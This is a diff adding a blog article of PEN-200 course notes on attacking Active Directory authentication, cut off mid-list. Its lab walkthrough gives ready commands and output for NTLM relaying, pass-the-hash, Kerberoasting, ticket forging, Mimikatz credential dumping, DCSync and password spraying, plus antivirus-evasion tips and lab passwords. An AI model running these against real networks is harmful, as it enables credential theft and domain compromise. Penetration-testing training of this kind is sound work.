@@ -1,0 +1,881 @@
+
+
+
+
+<article class="blog-article-body" data-slug="ad-auth-attacks">
+  <header class="blog-article-header">
+    <h1 class="blog-article-title">PEN-200 Module 22 — Attacking Active Directory Authentication</h1>
+    <p class="blog-article-meta">
+      
+        <span>Dec 12, 2023</span>
+      
+      
+        <span aria-hidden="true">•</span>
+        <span>98 min read</span>
+      
+      
+        <span aria-hidden="true">•</span>
+        <span>m4xx3d0ut</span>
+      
+    </p>
+  </header>
+
+  
+
+  <div class="blog-article-content">
+    <h2>TLDR;</h2>
+<p>Module 22 fuses theory with hands-on abuse. The raw notes outlined full command sequences; here’s the enriched version that keeps them together.</p>
+<h3>NTLM Abuse &amp; Relays</h3>
+<pre><code># Poison LLMNR/NetBIOS
+sudo responder -I tun0 -wrf
+
+# Relay captured hashes to SMB/HTTP
+python3 ntlmrelayx.py -tf targets-smb.txt --escalate-user svc-backup
+
+# Pass-the-hash for lateral movement
+psexec.py corp.local/backupuser@fileserver.corp.local -hashes :88e8a2...
+</code></pre>
+<ul>
+<li>Document which hosts lacked SMB signing or enforced NTLMv2 protections.</li>
+<li>Track credential reuse and update your lateral movement graph.</li>
+</ul>
+<h3>Kerberos Attacks</h3>
+<pre><code># AS-REP roasting
+Get-ADUser -Filter &quot;(userAccountControl -band 4194304)&quot; -Properties SamAccountName | select SamAccountName
+Invoke-ASREPRoast -OutputFile asrep.hashes
+hashcat -m 18200 asrep.hashes wordlists/rockyou.txt -r rules/dive.rule
+
+# Kerberoasting
+Get-ADUser -Filter {ServicePrincipalName -ne $null} -Properties ServicePrincipalName | select SamAccountName,ServicePrincipalName
+Invoke-Kerberoast -OutputFormat Hashcat -SPN &quot;HTTP/websrv1.corp.local&quot;
+hashcat -m 13100 kerberoast.hashes custom_wordlist.txt
+</code></pre>
+<ul>
+<li>Note cracked passwords, SPNs, and associated service owners.</li>
+</ul>
+<h3>Ticket Manipulation</h3>
+<ul>
+<li><strong>Overpass-the-Hash:</strong> <code>sekurlsa::pth /user:user /domain:corp.local /ntlm:&lt;hash&gt; /run:powershell.exe</code>.</li>
+<li><strong>Pass-the-Ticket:</strong> <code>kerberoast.exe ptt ticket.kirbi</code> or <code>mimikatz kerberos::ptt ticket.kirbi</code>.</li>
+<li><strong>Silver Tickets:</strong> Forge service tickets with <code>ticketer.py -nthash &lt;svc hash&gt; -domain corp.local -spn cifs/fileserver.corp.local backupuser</code>.</li>
+</ul>
+<p>Document which services accepted forged tickets and capture evidence (accessed share listing, executed commands).</p>
+<h3>DCSync &amp; Directory Replication</h3>
+<pre><code># Verify rights
+Get-ADUser -Identity backupuser -Properties MemberOf | Select-Object -ExpandProperty MemberOf
+
+# Pull secrets
+mimikatz &quot;lsadump::dcsync /domain:corp.local /user:corp\krbtgt&quot;
+secretsdump.py corp.local/backupuser@dc01.corp.local -just-dc
+</code></pre>
+<ul>
+<li>Record KRBTGT hashes and remind the client to rotate twice post-remediation.</li>
+</ul>
+<h3>Reporting Guidance</h3>
+<ul>
+<li>Provide cracked credential lists (sanitized) with rotation status.</li>
+<li>Recommend disabling LLMNR/NetBIOS, enforcing SMB signing, enabling Kerberos pre-auth, and moving service accounts to gMSA.</li>
+<li>Suggest monitoring for abnormal ticket requests, 4769/4624 events, and replication rights abuse.</li>
+</ul>
+<p>Mastery here sets the stage for lateral movement and persistence in the next module—log everything and pair offensive success with prescriptive defensive actions.</p>
+<h2>Working Notes... In Graphic Detail...</h2>
+<h3>22 Attacking Active Directory Authentication</h3>
+<ul>
+<li>Understanding Active Directory Authentication.</li>
+<li>Performing Attacks on Active Directory Authentication.</li>
+</ul>
+<h4>22.1 Understanding Active Directory Authentication</h4>
+<ul>
+<li>Understand NTLM Authentication.</li>
+<li>Understand Kerberos Authentication.</li>
+<li>Become familiar with cached AD Credentials.</li>
+</ul>
+<p>In this Learning Unit, we&#39;ll discuss the details of <a href="https://en.wikipedia.org/wiki/NT_LAN_Manager">NTLM</a> and <a href="https://en.wikipedia.org/wiki/Kerberos_(protocol)">Kerberos</a> authentication. In addition, we&#39;ll explore where and how AD credentials are cached on Windows systems.</p>
+<h5>NTLM Authentication</h5>
+<p>We briefly discussed what NTLM is and how to recover its hashes in Password Attacks.  Now we will explore it in the context of AD.</p>
+<p><a href="https://blogs.msdn.microsoft.com/chiranth/2013/09/20/ntlm-want-to-know-how-it-works/">NTLM auth</a> is used to auth a client to a server when connecting by IP address, instead of hostname, or if the user attempts to auth to a hostname that is not registered on the AD integrated DNS server.  Also, 3rd party apps may use NTLM instead of Kerberos.</p>
+<p>The 7 steps of NTLM proto consist of:
+<img src="assets/static/resources/da83831f0dd967c8c67585fcd2110c12.png" alt="da83831f0dd967c8c67585fcd2110c12.png"></p>
+<p>In the first step the system calculates the cryto hash, known as NTLM hash, from the user&#39;s password.  Next, the client computer sends the username to the server, which returns a &quot;nonce&quot; or challenge.  The client encrypts the none using the NTLM hash and sends it in the response to the server.</p>
+<p>The server forwards the response with the username and nonce to the DC, which already knows the NTLM hash of all users.  The DC encrypts the nonce with the NTLM hash of the username and compares it to the response recieved from the server.  If equal, auth request succeeds.</p>
+<p>NTLM cannot be reversed, but as it is a fast hashing algo short passwords can be cracked quickly using modest equipment.</p>
+<p><em>By using cracking software like Hashcat with top-of-the-line graphic processors, it is possible to test over 600 billion NTLM hashes every second. This means that eight-character passwords may be cracked within 2.5 hours and nine-character passwords may be cracked within 11 days.</em></p>
+<p>Even with the relative weakness of NTLM, disabling or blocking it requires extensive <a href="https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/ntlm-blocking-and-you-application-analysis-and-auditing/ba-p/397191">planning and prep</a>, it&#39;s an important fallback and used by many 3rd party apps.  We will encounter NTLM auth in the majority of assesments.</p>
+<p>Now that we have a general understanding of AD NTLM, we will explore Kerberos in the next section, the default auth proto in AD and for assocatied services.</p>
+<h5>Kerberos Authentication</h5>
+<p>MS Kerberos was adopted from Kerberos v5 created by MIT.  Kerberos has been the primary auth mechanism since Win Server 2003.  NTLM works via challenge/response, where Kerberos uses a ticket system.</p>
+<p>In NTLM auth, the client starts the auth process with the app server itself, whereas in Kerberos auth the DC takes the role of a <a href="https://blogs.msdn.microsoft.com/chiranth/2013/09/20/ntlm-want-to-know-how-it-works/">Key Distribution Center (KDC)</a>.  The client starts the auth process with the KDC, not the app server.  A KDC service runs on each DC and is responsible for session tickets and temporary session keys to users and computers.</p>
+<p>The client auth process at a high level:
+<img src="assets/static/resources/22acd580bc7d406fa3a4e26113a52ef3.png" alt="22acd580bc7d406fa3a4e26113a52ef3.png"></p>
+<p>The process in detail; when a user logs in to a workstation, an Authentication Server Request (AS-REQ) is sent to the DC.  The DC acting as KDC also maintains the Auth Server Service.  The AS-REQ contains a timestamp encrypted using a hash derived from the password of the user and their username.</p>
+<p>The DC receives the request and looks up the password hash associated with the specific user in the <a href="https://attack.mitre.org/techniques/T1003/003/">ntds.dit</a> file and attempts to decrypt the timestamp.  If decryption succeeds and the timestamp is not a duplicate, the auth is successful.</p>
+<p><em>If the timestamp is a duplicate, it could indicate evidence of a potential replay attack.</em></p>
+<p>Next the DC replies the client with an Authentication Server Reply (AS-REP).  Kerberos is a stateless proto, the AS-REP contains a session key and a Ticket Granting Ticket (TGT).  The session key is encrypted with the user&#39;s password hash and can be decrypted by the client then reused.  the TGT contains info regarding the user, domain, timestamp, IP of the client, and the session key.</p>
+<p>The TGT is encrypted by a secret key (NTLM hash of the <a href="https://adsecurity.org/?p=483">krbtgt</a> account) known only by the KDC and cannot be decrypted by the client to avoid tampering.  After the client receives the session key and the TGT, the KDC considers the client auth complete.  The TGT will be valid for 10 hours by default, at which point a renewal occurs.  This does not require the user to enter a password.</p>
+<p>When the user wants to access domain resources, network share or mailbox for example, it must again contact the KDC.</p>
+<p>This time the client contructs a Ticket Granting Service Request (TGS-REQ) packet that consists of the current user and a timestamp encrypted with the session key, the name of the resource, and the encrypted TGT.</p>
+<p>Next the ticket-granting service on the KDC receives the TGS-REQ, if the resource exists in the domain, the TGT is decrypted using the secret key known only to the KDC.  The session key is then extracted from the TGT and used to decrypt the username/timestamp of the request.  At this point the KDC performs a set of checks:</p>
+<ul>
+<li>The TGT must have a valid timestamp.</li>
+<li>The username from the TGS-REQ has to match the username from the TGT.</li>
+<li>The client IP address needs to coincide with the TGT IP address.
+If successful, the ticket-granting service responds to the client with a Ticket Granting Server Reply (TGS-REP), which contains three parts:</li>
+<li>The name of the service for which access has been granted.</li>
+<li>A session key to be used between the client and the service.</li>
+<li>A service ticket containing the username and group memberships along with the newly-created session key.
+The ticket&#39;s service name and session key are encrypted using the original session key associated with the creation of the TGT.  The service ticket is encrypted using the password hash of the service account registered with the service in question.</li>
+</ul>
+<p>Once the auth process is completed by the KDC and the client has the session key and a service ticket, the service auth begins.</p>
+<p>The client first sends the app server an Application Request (AP-REQ) including the username and a timestamp encrypted with the session key associated with the service ticket and the service ticket itself.</p>
+<p>The app server decrypts the service ticket using the service acocunt password hash and extracts the username/session key.  It uses the latter to decrypt the username from the AP-REQ, if the username matches the on decrypted from the service ticket, the request is accepted.  Before granting access, the service inspects the group memberships in the service ticket and assigns the user perms, after which the user may access the requested service.</p>
+<p>This proto may seem complex, but it was designed to mitigate various network attacks and prevent use of fake creds.  Next we will explore cahced cred storage and service account attacks.</p>
+<h5>Cached AD Credentials</h5>
+<p>We will first discuss the password hashes used in Kerberos and show how they are stored to lay the foundation of chached storage attacks and lateral movement vectors.</p>
+<p>We covered some of this information in the Password Attacks module.  In this section we&#39;ll focus on cached credentials and tickets in the context of AD.</p>
+<p>The MS implementation of Kerberos utilizes SSO, password hashes must be stored somewhere in order to renew a TGT request.</p>
+<p>These hashes are stored in the <a href="https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service">Local Security Authority Subsystem Service (LSASS)</a> <a href="https://adsecurity.org/?page_id=1821">memory space</a>.</p>
+<p>If we can access these hashes we could crack them to obtain cleartext passowrds or reuse them in attacks.</p>
+<p>This is the end goal of our AD attack, but the process is not straightforward.  Since the LSASS process is part of the OS and runs as SYSTEM we must obtain SYSTEM (or local admin) perms to access the hashes stored on the target sys.</p>
+<p>As such, we must first begin with PrivEsc in order to retrieve the hashes.  Adding to the complexity, the data structures that store the hashes in memory are not publicly documented and are encrypted with a LSASS-stored key.</p>
+<p>Regardless of this, extraction of the cached creds is a big attack vector against Win/AD and several tools exist for this purpose.  The most popular is Mimikatz.</p>
+<p>As an example, we will use Mimikatz to extract domain hashes on our Win 11 sys.</p>
+<p><em>In the following example, we will run Mimikatz as a standalone application. However, due to the mainstream popularity of Mimikatz and well-known detection signatures, consider avoiding using it as a standalone application and use methods discussed in the Antivirus Evasion Module instead. For example, execute Mimikatz directly from memory using an injector like PowerShell, or use a built-in tool like Task Manager to dump the entire LSASS process memory, move the dumped data to a helper machine, and then load the data into Mimikatz.</em></p>
+<p>Since <code>jeff</code> domain user is local admin on CLIENT75, we can launch a PowerShell with elevated privs. Let&#39;s try to connect to this machine as <code>jeff</code> with password <code>HenchmanPutridBonbon11</code> via RDP.</p>
+<p>Once connected, start a PS session as Admin.  We can start Mimikatz from this command prompt and enter <code>privilege::debug</code> to engage the <code>SeDebugPrivilege</code> priv, which allows us to interact with a proc owned by another account.</p>
+<pre><code class="language-powershell">PS C:\Windows\system32&gt; cd C:\Tools\
+PS C:\Tools&gt; .\mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 14 2022 15:03:52
+ .## ^ ##.  &quot;A La Vie, A L&#39;Amour&quot; - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
+ &#39;## v ##&#39;       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  &#39;#####&#39;        &gt; https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # privilege::debug
+Privilege &#39;20&#39; OK
+</code></pre>
+<p>Next we run <code>sekurlsa::logonpasswords</code> to dump the creds of all logged-on users with the <a href="https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa">Sekurlsa</a> module.</p>
+<p>This will dump the hashes of all logged on users of the current workstation/server, including remote logins like RDP sessions.</p>
+<pre><code class="language-bash">mimikatz # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 3726316 (00000000:0038dbec)
+Session           : Batch from 0
+User Name         : dave
+Domain            : CORP
+Logon Server      : DC1
+Logon Time        : 12/14/2023 7:32:28 AM
+SID               : S-1-5-21-1987370270-658905905-1781884369-1103
+        msv :
+         [00000003] Primary
+         * Username : dave
+         * Domain   : CORP
+         * NTLM     : 08d7a47a6f9f66b97b1bae4178747494
+         * SHA1     : a0c2285bfad20cc614e2d361d6246579843557cd
+         * DPAPI    : fed8536adc54ad3d6d9076cbc6dd171d
+        tspkg :
+        wdigest :
+         * Username : dave
+         * Domain   : CORP
+         * Password : (null)
+        kerberos :
+         * Username : dave
+         * Domain   : CORP.COM
+         * Password : (null)
+        ssp :
+        credman :
+        cloudap :       KO
+
+Authentication Id : 0 ; 3714653 (00000000:0038ae5d)
+Session           : Batch from 0
+User Name         : dave
+Domain            : CORP
+Logon Server      : DC1
+Logon Time        : 12/14/2023 7:31:28 AM
+SID               : S-1-5-21-1987370270-658905905-1781884369-1103
+        msv :
+         [00000003] Primary
+         * Username : dave
+         * Domain   : CORP
+         * NTLM     : 08d7a47a6f9f66b97b1bae4178747494
+         * SHA1     : a0c2285bfad20cc614e2d361d6246579843557cd
+         * DPAPI    : fed8536adc54ad3d6d9076cbc6dd171d
+        tspkg :
+        wdigest :
+         * Username : dave
+         * Domain   : CORP
+         * Password : (null)
+        kerberos :
+         * Username : dave
+         * Domain   : CORP.COM
+         * Password : (null)
+        ssp :
+        credman :
+        cloudap :       KO
+
+Authentication Id : 0 ; 3646621 (00000000:0037a49d)
+Session           : Batch from 0
+User Name         : dave
+Domain            : CORP
+Logon Server      : DC1
+Logon Time        : 12/14/2023 7:30:28 AM
+SID               : S-1-5-21-1987370270-658905905-1781884369-1103
+        msv :
+         [00000003] Primary
+         * Username : dave
+         * Domain   : CORP
+         * NTLM     : 08d7a47a6f9f66b97b1bae4178747494
+         * SHA1     : a0c2285bfad20cc614e2d361d6246579843557cd
+         * DPAPI    : fed8536adc54ad3d6d9076cbc6dd171d
+        tspkg :
+        wdigest :
+         * Username : dave
+         * Domain   : CORP
+         * Password : (null)
+        kerberos :
+         * Username : dave
+         * Domain   : CORP.COM
+         * Password : (null)
+        ssp :
+        credman :
+        cloudap :       KO
+
+Authentication Id : 0 ; 3543360 (00000000:00361140)
+Session           : Batch from 0
+User Name         : dave
+Domain            : CORP
+Logon Server      : DC1
+Logon Time        : 12/14/2023 7:29:28 AM
+SID               : S-1-5-21-1987370270-658905905-1781884369-1103
+        msv :
+         [00000003] Primary
+         * Username : dave
+         * Domain   : CORP
+         * NTLM     : 08d7a47a6f9f66b97b1bae4178747494
+         * SHA1     : a0c2285bfad20cc614e2d361d6246579843557cd
+         * DPAPI    : fed8536adc54ad3d6d9076cbc6dd171d
+        tspkg :
+        wdigest :
+         * Username : dave
+         * Domain   : CORP
+         * Password : (null)
+        kerberos :
+         * Username : dave
+         * Domain   : CORP.COM
+         * Password : (null)
+        ssp :
+        credman :
+        cloudap :       KO
+...
+</code></pre>
+<p>The output shows the creds stored in LSASS for the domain users <code>jeff</code> and <code>dave</code> along with cached hashes.</p>
+<p><em>An effective defensive technique to prevent tools such as Mimikatz from extracting hashes is to enable additional LSA Protection. The LSA includes the LSASS process. By setting a registry key, Windows prevents reading memory from this process. We&#39;ll discuss how to bypass this and other powerful defensive mechanisms in-depth in OffSec&#39;s Evasion Techniques and Breaching Defenses course, PEN-300.</em></p>
+<p>We can observe two types of hashes highlighted in the output above.  This varies based on the functional level of the AD implementation.  AD instances at a func level of Win 2003 only have NTLM available as a hashing algo, whereas Win Server 2008 or later may have both NTLM and SHA-1, companion to AES encryption, available.  Older systems, Win 7 or systems where it is manually set, will have WDigest enabled.  When WDigest is enabled Mimikatz will reveal cleartext passwords alongside the hashed passwords.</p>
+<p>We can attempt to crack the hashes to obtain cleartext passwords.</p>
+<p>Another approach is to use Mimikatz to exploit Kerberos auth by abusing TGT and service tickets.  We know that Kerberos TGT and service tickets for users logged on to the local machine are stored for future use, they are also stored in the LSASS, and we can use Mimikatz to retrieve our own tickets as well as those of other local users.</p>
+<p>Let&#39;s open a second PowerShell window and list the contents of the SMB share on WEB04 with UNC path <code>\\web04.corp.com\backup</code>, which will create a cached service ticket.  Once we&#39;ve executed the directory list on the share we can use Mimikatz to show the tickets that are stored in memory by entering <code>sekurlsa::tickets</code>.</p>
+<pre><code class="language-bash">mimikatz # sekurlsa::tickets
+
+Authentication Id : 0 ; 4188466 (00000000:003fe932)
+Session           : Batch from 0
+User Name         : dave
+Domain            : CORP
+Logon Server      : DC1
+Logon Time        : 12/14/2023 7:45:28 AM
+SID               : S-1-5-21-1987370270-658905905-1781884369-1103
+
+         * Username : dave
+         * Domain   : CORP.COM
+         * Password : (null)
+
+        Group 0 - Ticket Granting Service
+         [00000000]
+           Start/End/MaxRenew: 12/14/2023 7:45:28 AM ; 12/14/2023 5:45:28 PM ; 12/21/2023 7:45:28 AM
+           Service Name (02) : cifs ; web04.corp.com ; @ CORP.COM
+           Target Name  (02) : cifs ; web04.corp.com ; @ CORP.COM
+           Client Name  (01) : dave ; @ CORP.COM
+           Flags 40810000    : name_canonicalize ; renewable ; forwardable ;
+           Session Key       : 0x00000001 - des_cbc_crc
+             7a16c6b1bfda039d5040f1093746edb4c1aaf295fa4e7f411185a11435897293
+           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 11       [...]
+         [00000001]
+           Start/End/MaxRenew: 12/14/2023 7:45:28 AM ; 12/14/2023 5:45:28 PM ; 12/21/2023 7:45:28 AM
+           Service Name (02) : ProtectedStorage ; DC1.corp.com ; @ CORP.COM
+           Target Name  (02) : ProtectedStorage ; DC1.corp.com ; @ CORP.COM
+           Client Name  (01) : dave ; @ CORP.COM
+           Flags 40850000    : name_canonicalize ; ok_as_delegate ; renewable ; forwardable ;
+           Session Key       : 0x00000001 - des_cbc_crc
+             58e2c107750483b575f4115074487f7cf564865b4f3bd717aeae20c630638382
+           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 11       [...]
+         [00000002]
+           Start/End/MaxRenew: 12/14/2023 7:45:28 AM ; 12/14/2023 5:45:28 PM ; 12/21/2023 7:45:28 AM
+           Service Name (02) : cifs ; DC1.corp.com ; @ CORP.COM
+           Target Name  (02) : cifs ; DC1.corp.com ; @ CORP.COM
+           Client Name  (01) : dave ; @ CORP.COM
+           Flags 40850000    : name_canonicalize ; ok_as_delegate ; renewable ; forwardable ;
+           Session Key       : 0x00000001 - des_cbc_crc
+             9a06ff83a3a51ebba42bca76181e9b93ac0a79aff7a7d996940a993b0bec2339
+           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 11       [...]
+
+        Group 1 - Client Ticket ?
+
+        Group 2 - Ticket Granting Ticket
+         [00000000]
+           Start/End/MaxRenew: 12/14/2023 7:45:28 AM ; 12/14/2023 5:45:28 PM ; 12/21/2023 7:45:28 AM
+           Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
+           Target Name  (--) : @ CORP.COM
+           Client Name  (01) : dave ; @ CORP.COM ( $$Delegation Ticket$$ )
+           Flags 60810000    : name_canonicalize ; renewable ; forwarded ; forwardable ;
+           Session Key       : 0x00000001 - des_cbc_crc
+             10d6db98bb18f353d9962e9c2527a94bbf732a2f160ed2467d847b0e482549bc
+           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
+         [00000001]
+           Start/End/MaxRenew: 12/14/2023 7:45:28 AM ; 12/14/2023 5:45:28 PM ; 12/21/2023 7:45:28 AM
+           Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
+           Target Name  (02) : krbtgt ; CORP ; @ CORP.COM
+           Client Name  (01) : dave ; @ CORP.COM ( CORP )
+           Flags 40c10000    : name_canonicalize ; initial ; renewable ; forwardable ;
+           Session Key       : 0x00000001 - des_cbc_crc
+             abd5a8b1f9b751167024b392180c59d5c9568e56b0ae56f743bc5d41d1e4fd67
+           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
+...
+</code></pre>
+<ul>
+<li>Output shows both TGT and TGS.</li>
+<li>Stealing TGS would allow us access only to particular resources associated with those tickets.</li>
+<li>On the other hand, the TGT allows us to request a TGS for specific resources we want to target in the domain.
+<em>We will discuss leveraging stolen/forged tickets later in module.</em></li>
+</ul>
+<p>Mimikatz can also export tickets to disk and import tickets into LSASS, which we will explore later.</p>
+<p>Before covering attacks on AD auth mechanisms, we will briefly explore the use of <a href="https://en.wikipedia.org/wiki/Public_key_infrastructure">Public Key Infrastructure (PKI)</a> in AD.  MS provides the AD roles <a href="https://docs.microsoft.com/en-us/training/modules/implement-manage-active-directory-certificate-services/">Active Directory Certificate Services (AD CS)</a> to implement a PKI, which exchanges digitial certs between authenticated users and trusted resources.</p>
+<p>If a server is installed as a <a href="https://docs.microsoft.com/en-us/training/modules/implement-manage-active-directory-certificate-services/">Certificate Authority (CA)</a> to implement a PKI, which exchanges digital certs between authenticated users and trusted resources.</p>
+<p>If a server is installed as a <a href="https://docs.microsoft.com/en-us/training/modules/implement-manage-active-directory-certificate-services/">Certification Authority (CA)</a> it can issue and revoke digital certs and more.  Let&#39;s focus on one aspect of cached and stored objects related to AD CS.</p>
+<p>For example, we could issue a cert for web servers to use HTTPS or to auth users based on certs from CA via <a href="https://en.wikipedia.org/wiki/Smart_card">Smart Cards</a>.</p>
+<p>Such certs may be marked as having a <a href="https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/marking-private-keys-as-non-exportable-with-certutil-importpfx/ba-p/1128390">non-exportable private key</a> for security reasons.  If true a priv key assocuated with a cert can&#39;t be exported, even with admin privs.  There are, however, various methods to export the cert with the priv key.</p>
+<p>We can rely again on Mimikatz for this.  The <a href="https://github.com/gentilkiwi/mimikatz/wiki/module-~-crypto">crypto</a> module contains the ability to patch the <a href="https://github.com/gentilkiwi/mimikatz/wiki/module-~-crypto">CryptoAPI</a> function with <code>crypto::capi</code> or <a href="http://revertservice.com/10/keyiso/">KeyIso</a> service with <code>crypto::cng</code>, which makes non-exportable keys exportable.</p>
+<h4>22.2 Performing Attacks on Active Directory Authentication</h4>
+<ul>
+<li>Use password attacks to obtain valid user credentials.</li>
+<li>Abuse enabled user account options.</li>
+<li>Abuse the Kerberos SPN authentication mechanism.</li>
+<li>Forge service tickets.</li>
+<li>Impersonate a domain controller to retrieve any domain user credentials.</li>
+</ul>
+<h5>Password Attacks</h5>
+<p>Previously we examined several password attacks on network services and hashed information, they are also a viable option to obtain AD user creds.</p>
+<p>Before going into detail, we must account for one important factor.  When running brute force or wordlist attacks, we must be aware of account lockouts.  A number of failed logins may result in the account being blocked and possibly alert the SA.</p>
+<p>To learn more about lockouts, review the domain account policy as domain user <code>jeff</code> on CLIENT75.  We can connect to the sys with password <code>HenchmanPutridBonbon11</code> via RDP, open PowerShell, and exec <code>net accounts</code> to obtain the account policy.</p>
+<pre><code class="language-powershell">PS C:\Users\jeff&gt; net accounts
+Force user logoff how long after time expires?:       Never
+Minimum password age (days):                          1
+Maximum password age (days):                          42
+Minimum password length:                              7
+Length of password history maintained:                24
+Lockout threshold:                                    5
+Lockout duration (minutes):                           30
+Lockout observation window (minutes):                 30
+Computer role:                                        WORKSTATION
+The command completed successfully.
+</code></pre>
+<ul>
+<li>Lockout threshold.</li>
+<li>Limit of 5 login attempts before lockout.</li>
+<li>We can safely attempt 4 logins before a lockout is triggered.</li>
+<li>Lockout observation window.</li>
+<li>30 minutes after the last failed login we can make additional attempts.</li>
+</ul>
+<p>This would allow us to attempt 192 logins in a 24 hr period against every domain user without triggering a lockout, assuming the actual users don&#39;t fail a login attempt.</p>
+<p>This might consist of compiling a short list of very common passwords to leverage against a large amount of users.  This type of attack can reveal quite a few weak account passwords in the org.</p>
+<p>This would also generate a huge amount of network traffic.  Let&#39;s review 3 kinds  of passowrd spraying attacks that have a higher chance of success in an AD env.</p>
+<p>The first uses LDAP and ADSI to perform a &quot;low and slow&quot; password spray attack against AD users.  We previously performed queries against the DC as a logged-in user with <a href="https://docs.microsoft.com/de-de/dotnet/api/system.directoryservices.directoryentry?view=dotnet-plat-ext-6.0">DirectoryEntry</a>, but we can also make queries in the context of a different user by setting the DirectoryEntry instance.</p>
+<p>In the AD Introduction and Enumeration module we used <code>DirectoryEntry</code> constructor without args, but we can provide 3, including the LDAP path to the DC, the username, and the password.</p>
+<pre><code class="language-powershell">PS C:\Users\jeff&gt; $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+
+distinguishedName : {DC=corp,DC=com}
+Path              : LDAP://DC1.corp.com/DC=corp,DC=com
+</code></pre>
+<ul>
+<li>As shown above, if the password of the user account is correct the object creation will be successful.</li>
+</ul>
+<p>If the password of the user account is invalid, no object will be created and we will receive an exception.  Let&#39;s change the password to <code>WrongPassword</code>, we will notice a warning that username/password is incorrect.</p>
+<pre><code class="language-powershell">PS C:\Users\jeff&gt; New-Object System.DirectoryServices.DirectoryEntry($SearchString, &quot;pete&quot;, &quot;WrongPassword&quot;)
+format-default : The following exception occurred while retrieving member &quot;distinguishedName&quot;:
+&quot;The user name or password is incorrect.
+&quot;
+    + CategoryInfo          : NotSpecified: (:) [format-default], ExtendedTypeSystemException
+    + FullyQualifiedErrorId : CatchFromBaseGetMember,Microsoft.PowerShell.Commands.FormatDefaultC
+   ommand
+</code></pre>
+<p>We can use this technique to create a PowerShell script that enums all users and performs auth according to the Lockout threshold and Lockout observation window.</p>
+<p>This password spray tactic is implemented in the PS script <code>C:\Tools\Spray-Passwords.ps1</code> on CLIENT75.</p>
+<p>The <code>-Pass</code> option allows us to set a single password to test or we can submit a word list with the <code>-File</code> option.  We can test admin accounts with the <code>-Admin</code> flag.  The PS script automatically identifies domain users and sprays passwords against them.</p>
+<pre><code class="language-powershell">PS C:\Users\jeff&gt; cd C:\Tools\
+PS C:\Tools&gt; .\Spray-Passwords.ps1 -Pass Nexus123! -Admin
+WARNING: also targeting admin accounts.
+Performing brute force - press [q] to stop the process and print results...
+Guessed password for user: &#39;pete&#39; = &#39;Nexus123!&#39;
+Guessed password for user: &#39;jen&#39; = &#39;Nexus123!&#39;
+Users guessed are:
+ &#39;pete&#39; with password: &#39;Nexus123!&#39;
+ &#39;jen&#39; with password: &#39;Nexus123!&#39;
+</code></pre>
+<ul>
+<li>The spray attack succeeds, providing us 2 valid sets of creds with password <code>Nexus123!</code></li>
+</ul>
+<p>The second password spray attack against AD leverages SMB.  This is one of the traditional password attacks in AD and has several drawbacks.  Example, for each auth attempt a full SMB connection has to be set up and then terminated.  This generates a lot of traffic making it very noisy, it&#39;s also very slow compared to other techniques.</p>
+<p>We can use <code>crackmapexec</code> on Kali to perform this kind of password spray.  We select <code>smb</code> as the proto and enter the IP of any domain joined sys, such as CLIENT75.  We can provide a list or single users and passwords to <code>-u</code> and <code>-p</code>, then enter domain name for <code>-d</code> and provide the <code>--continue-on-success</code> option to prevent stopping on first set of valid creds.  For this example, create a text file names <code>users.txt</code> containing a subset of domain usernames:</p>
+<ul>
+<li><code>dave</code></li>
+<li><code>jen</code></li>
+<li><code>pete</code>
+Then spray password <code>Nexus123!</code> against them.</li>
+</ul>
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/AD]
+└─$ for u in dave jen pete; echo $u &gt;&gt; users.txt
+                                                                                         
+┌──(operator㉿labhost)-[~/OffSec/AD]
+└─$ cat users.txt 
+dave
+jen
+pete
+
+
+┌──(operator㉿labhost)-[~/OffSec/AD]
+└─$ crackmapexec smb 192.168.242.75 -u users.txt -p &#39;Nexus123!&#39; -d corp.com --continue-on-success
+[*] First time use detected
+[*] Creating home directory structure
+[*] Creating default workspace
+[*] Initializing RDP protocol database
+[*] Initializing SSH protocol database
+[*] Initializing MSSQL protocol database
+[*] Initializing SMB protocol database
+[*] Initializing FTP protocol database
+[*] Initializing LDAP protocol database
+[*] Initializing WINRM protocol database
+[*] Copying default configuration file
+[*] Generating SSL certificate
+SMB         192.168.242.75  445    CLIENT75         [*] Windows 10.0 Build 22000 x64 (name:CLIENT75) (domain:corp.com) (signing:False) (SMBv1:False)
+SMB         192.168.242.75  445    CLIENT75         [-] corp.com\dave:Nexus123! STATUS_LOGON_FAILURE 
+SMB         192.168.242.75  445    CLIENT75         [+] corp.com\jen:Nexus123! 
+SMB         192.168.242.75  445    CLIENT75         [+] corp.com\pete:Nexus123!
+</code></pre>
+<ul>
+<li>Crackmapexec identified the same valid creds as <code>Spray-Passwords.ps1</code></li>
+<li>NOTE: crackmapexec doesn&#39;t examine the password policy of the domain before starting, therefore we should be cautious about locking out user accounts with this method.</li>
+</ul>
+<p>As a bonus, the output also shows if the user with identified creds has admin privs on the target sys.  Example, <code>dave</code> is local admin on CLIENT75, use crackmapexec with the password <code>Flowers1</code> targeting this sys.</p>
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/AD]
+└─$ crackmapexec smb 192.168.242.75 -u dave -p &#39;Flowers1&#39; -d corp.com                   
+SMB         192.168.242.75  445    CLIENT75         [*] Windows 10.0 Build 22000 x64 (name:CLIENT75) (domain:corp.com) (signing:False) (SMBv1:False)
+SMB         192.168.242.75  445    CLIENT75         [+] corp.com\dave:Flowers1 (Pwn3d!)
+</code></pre>
+<ul>
+<li>Crackmapexec added <code>Pwn3d!</code> to the output.</li>
+<li>Indicating that <code>dave</code> has admin privs on the target sys.</li>
